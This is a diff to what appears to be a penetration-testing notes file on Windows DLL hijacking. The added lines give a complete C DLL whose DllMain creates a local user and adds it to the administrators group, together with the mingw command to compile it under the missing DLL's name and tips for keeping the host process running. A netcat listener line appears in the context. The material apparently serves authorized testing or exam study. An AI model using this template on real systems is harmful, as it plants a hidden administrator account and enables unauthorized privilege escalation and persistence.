@@ -32,3 +32,22 @@ nc -lvnp <PORT>
 ```
 - Exact DLL name, matching architecture. Copy it to the confirmed path, trigger the launcher, check `whoami`.
 - Keep the original file if one existed; remove your test DLL afterwards.
+- A bare msfvenom DLL often crashes the host process (no real export table, no `DllMain`): if the launcher dies instead of running your payload, use the custom DLL below.
+- icacls legend, local-admin payload template: [service-binary-hijacking.md](service-binary-hijacking.md#icacls-rights-legend).
+
+## Custom DLL (survives the host process)
+```c
+#include <windows.h>
+#include <stdlib.h>
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("net user <LOCAL-USER> <PW> /add");
+        system("net localgroup administrators <LOCAL-USER> /add");
+    }
+    return TRUE;
+}
+```
+```bash
+x86_64-w64-mingw32-gcc -shared -o <MISSING-DLL-NAME>.dll payload.c
+```
+- Runs on `DLL_PROCESS_ATTACH`, returns `TRUE` so the host keeps loading normally instead of crashing.
